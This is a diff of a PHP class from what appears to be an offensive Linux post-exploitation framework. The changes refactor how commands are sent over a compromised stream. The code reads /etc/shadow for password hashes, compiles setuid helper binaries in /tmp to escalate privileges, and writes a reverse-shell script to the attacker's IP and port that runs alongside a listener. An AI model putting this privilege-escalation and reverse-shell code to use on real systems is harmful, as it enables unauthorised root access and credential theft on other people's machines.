@@ -70,11 +70,12 @@ class lan4linux extends LAN{
         if ($this->context !== "listening_Server" ){
             $sql_r = "SELECT templateB64_id FROM LAN WHERE $this->lan2where ORDER BY ladate DESC LIMIT 1 ";           
             if ($this->checkBD($sql_r)) {
-                if ($this->lan2check4id8db($this->port2id,$this->templateB64_id,$this->id8b64)!==FALSE){
+                if ($this->check4id8db($this->port2id,$this->templateB64_id,$this->id8b64)!==FALSE){
                     $chaine = "Escalation Already Done for $this->uid_name";
                     $this->article($this->uid_name, $this->id8str);
                     $this->log2error($chaine);
                     $this->rouge("out from ".__FUNCTION__);$this->pause();
+                    $this->lan2brief();
                     exit() ;  
                 }
             }
@@ -92,7 +93,7 @@ class lan4linux extends LAN{
         }
          
         
-        $this->lan2init();
+       // $this->lan2init();
 
     }
     
@@ -136,7 +137,7 @@ class lan4linux extends LAN{
         
         
         $data = "cat /etc/shadow ";
-        $tmp = $this->lan2stream4result($data,$this->stream_timeout);
+        $tmp = $this->req_str($stream,$data,$this->stream_timeout,"");
         exec("echo '$tmp' | grep ':'   ",$tab_tmp);
         $shadow_str = $this->tab($tab_tmp);
         if ( (!empty($shadow_str)) && (strstr($shadow_str, "root:")) ){
@@ -360,11 +361,11 @@ class lan4linux extends LAN{
             }
         }
         else {
-            if (!$this->ip2root8db($this->ip2id)) {$this->misc();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->suids();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->users();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->jobs();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->exploits();$this->pause();}
+            if (!$this->ip2root8db($this->ip2id)) {$this->misc($this->stream);$this->pause();}
+            //if (!$this->ip2root8db($this->ip2id)) {$this->suids($this->stream);$this->pause();}
+            if (!$this->ip2root8db($this->ip2id)) {$this->users($this->stream);$this->pause();}
+            //if (!$this->ip2root8db($this->ip2id)) {$this->jobs($this->stream);$this->pause();}
+            //if (!$this->ip2root8db($this->ip2id)) {$this->exploits($this->stream);$this->pause();}
         }
         
         $this->lan2brief();
@@ -378,7 +379,7 @@ class lan4linux extends LAN{
     
     
     
-    public function lan2pentest8id($template_id_euid){
+    public function pentest8id($stream,$template_id_euid){
         
         $this->titre(__FUNCTION__);
         $attacker_ip = $this->ip4addr4target($this->ip);
@@ -397,7 +398,7 @@ class lan4linux extends LAN{
         
         $id = "id";
         $cmd_id = str_replace("%ID%", $id, $template_id);
-        $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout*3);
+        $rst_id = $this->req_str($stream,$cmd_id,$this->stream_timeout*3,"");
         //var_dump($rst_id);
         
         
@@ -405,7 +406,7 @@ class lan4linux extends LAN{
             $chaine = "Asking Password";
             $this->rouge($chaine);
             $data = "";
-            $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+            $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
             
         }
         
@@ -416,26 +417,33 @@ class lan4linux extends LAN{
         $id8b64 = base64_encode($id8str);
         if (!empty($uid_name) ){
             
-            if ( (empty($euid_name)) && ($uid_name !== $this->uid_name) ){
+            if ( empty($euid_name)){
+                if ($uid_name !== $this->uid_name) {
                 $this->article("Old UID NAME", $this->uid_name);
                 $this->log2succes("check new USER:$uid_name");$this->pause();
                 $template_cmd2 = str_replace("%SHELL%",addcslashes($template_id,'"'),$this->template_shell);
                 $template_cmd = str_replace("%ID%","%CMD%",$template_cmd2);
                 $templateB64_cmd = base64_encode($template_cmd);
-                
+                $template_shell = str_replace("%CMD%","%SHELL%",$template_cmd);
+                $templateB64_shell = base64_encode($template_shell);
                 
                 $templateB64_id = base64_encode($template_id);
                 $this->article("CREATE Template ID", $template_id);
                 $this->article("CREATE Template CMD", $template_cmd);
-                
+                $this->article("CREATE Template SHELL", $template_shell);
                 $this->pause();
                 
-                $obj_lan_root1 = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$this->templateB64_shell,$id8b64);
+                $obj_lan_root1 = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
                 $obj_lan_root1->poc($this->flag_poc);
                 $obj_lan_root1->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
                 
+              
+                
             }
-            if (!empty($euid_name) && $this->uid_name !==$euid_name){
+            
+            }
+            if (!empty($euid_name) ){
+                if ($this->uid_name !==$euid_name){
                 $this->rouge("try to spawn $euid_name ");$this->pause();
                 
                 $template_id_new = $this->lan2spawn2shell8euid($template_id,$euid_name);$this->pause();
@@ -479,7 +487,7 @@ class lan4linux extends LAN{
                 $this->article("OLD Template ID", $this->template_id);
                 $this->article("OLD Template CMD", $this->template_cmd);
                 
-                $obj_lan_root = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
+                $obj_lan_root = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
                 $obj_lan_root->poc($this->flag_poc);
                 
                 $this->pause();
@@ -499,16 +507,15 @@ class lan4linux extends LAN{
                     if ($obj_lan_root->uid_name==="root" ) {
                         $this->log2succes("Yes RooT running infos");
                         
-                        $obj_lan_root->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
-                        
                     }
                     else {
                         
                         $this->log2succes("$obj_lan_root->uid_name is not root checking again");
-                        $obj_lan_root->lan2check8id($attacker_ip, $attacker_port, $shell);$this->pause();
+                        
                     }
-                    
+                    $obj_lan_root->lan2check8id($attacker_ip, $attacker_port, $shell);$this->pause();
                 }
+            }
             }
         }
         $this->rouge("out from ".__FUNCTION__);$this->pause();
@@ -517,7 +524,7 @@ class lan4linux extends LAN{
     
     
     
-    public function lan2spawn2shell8euid($template_id,$euid_name){
+    public function lan2spawn2shell8euid($stream,$template_id,$euid_name){
         $this->ssTitre(__FUNCTION__);
         $result = "";
         $euid_name = trim($euid_name);
@@ -529,7 +536,7 @@ class lan4linux extends LAN{
         
         
         $data = "$cmd_id";
-        $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+        $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
         $hashname = sha1("$this->templateB64_id");
         if (strstr($rst_id, "euid=")) {
             
@@ -564,16 +571,16 @@ EOC;
             
             $elf = new bin4linux("/tmp/seteuid_id_$euid_name");
             $query = "echo '$seteuid' > $elf->file_path.c  ";
-            $this->lan2stream4result($query,$this->stream_timeout);
+            $this->req_str($stream,$query,$this->stream_timeout,"");
             $query = "ls -al $elf->file_path.c ";
-            $this->lan2stream4result($query,$this->stream_timeout);
+            $this->req_str($stream,$query,$this->stream_timeout,"");
             $data = "bash -p -c 'gcc -o $elf->file_path $elf->file_path.c && chmod 6777 $elf->file_path'";
             $data2 = str_replace("%ID%",$data, $template_id);
-            $this->lan2stream4result($data2,$this->stream_timeout);
+            $this->req_str($stream,$data2,$this->stream_timeout,"");
             $data = "ls -al $homeuser ";
-            $this->lan2stream4result($query,$this->stream_timeout);
+            $this->req_str($stream,$query,$this->stream_timeout,"");
             $data = str_replace("%ID%","$elf->file_path", $template_id);
-            $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+            $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
             
             list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
             $id8b64 = base64_encode($id);
@@ -612,16 +619,16 @@ return 0;
 EOC;
                     $elf = new bin4linux("/tmp/shell_id_$euid_name");
                     $query = "echo '$seteuid' > $elf->file_path.c  ";
-                    $this->lan2stream4result($query,$this->stream_timeout);
+                    $this->req_str($stream,$query,$this->stream_timeout,"");
                     $query = "ls -al $elf->file_path.c ";
-                    $this->lan2stream4result($query,$this->stream_timeout);
+                    $this->req_str($stream,$query,$this->stream_timeout,"");
                     $data = "bash -p -c 'gcc -o $elf->file_path $elf->file_path.c && chmod 6777 $elf->file_path'";
                     $data2 = str_replace("%ID%",$data, $template_id);
-                    $this->lan2stream4result($data2,$this->stream_timeout);
+                    $this->req_str($stream,$data2,$this->stream_timeout,"");
                     $data = "ls -al $homeuser ";
-                    $this->lan2stream4result($query,$this->stream_timeout);
+                    $this->req_str($stream,$query,$this->stream_timeout,"");
                     $data = str_replace("%ID%","$elf->file_path id", $template_id);
-                    $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
+                    $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
                     
                     list($new_uid_found,$new_username_found,$new_gid_found,$new_groupname_found,$new_euid,$new_username_euid,$new_egid,$new_groupname_egid,$new_groups,$context,$id8b64) = $this->parse4id($rst_id);
                     
@@ -662,14 +669,14 @@ EOC;
         $cmd = str_replace("%ID%", $data, $this->template_id);
         $cmd_exec = base64_encode($cmd);
         //$cmd = "echo '$cmd_exec' | base64 -d | bash -  ";
-        return $this->stream4result($this->stream, $cmd, $timeout);
+        return $this->req_str($this->stream, $cmd, $timeout,"");
     }
     
     public function lan2check8id($attacker_ip, $attacker_port, $shell){
         $this->ssTitre(__FUNCTION__);
         
         $query = str_replace("%CMD%", "id", $this->template_cmd);
-        $this->requette($query);
+        $this->requette("$query | grep 'uid=' ");
         $this->pause();
         
         $cmd_nc = $this->rev8sh($attacker_ip, $attacker_port, $shell);
@@ -683,20 +690,21 @@ EOC;
         //$data = "echo \"$cmd_nc\" > /tmp/$hash_cmd_rev.sh";
         $data = "echo \"#!/bin/bash\n$cmd_nc\" > /tmp/$hash_cmd_rev.sh ; chmod 6777 /tmp/$hash_cmd_rev.sh";
         $this->requette($data);$this->pause();
-        $this->stream4result($this->stream,$data, $this->stream_timeout);
+        $this->req_str($this->stream,$data, $this->stream_timeout,"");
         
         $data = "ls -al /tmp/$hash_cmd_rev.sh";
-        $this->stream4result($this->stream,$data, $this->stream_timeout);
+        $this->req_str($this->stream,$data, $this->stream_timeout,"");
         $data = "cat /tmp/$hash_cmd_rev.sh";
-        $this->stream4result($this->stream,$data, $this->stream_timeout);
+        $this->req_str($this->stream,$data, $this->stream_timeout,"");
         $cmd2 = str_replace("%CMD%","/tmp/$hash_cmd_rev.sh",$this->template_cmd);
         $this->article("TEMPLATE CMD", $this->template_cmd);
         
         $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $lprotocol $this->templateB64_cmd $this->templateB64_shell server 60 listening_Server\" ";
         //$cmd2 = str_replace("%ID%","/tmp/$hash_cmd_rev.sh",$this->template_id);
-        $cmd3 = str_replace("%SHELL%","/tmp/$hash_cmd_rev.sh",$this->template_shell);
+        //$cmd3 = str_replace("%SHELL%","/tmp/$hash_cmd_rev.sh",$this->template_shell);
+        $cmd4 = str_replace("%CMD%","/tmp/$hash_cmd_rev.sh",$this->template_cmd);
         
-        $this->exec_parallel($cmd1, $cmd3, $this->stream_timeout);
+        $this->exec_parallel($cmd1, $cmd4, $this->stream_timeout);
         
         
         $this->pause();
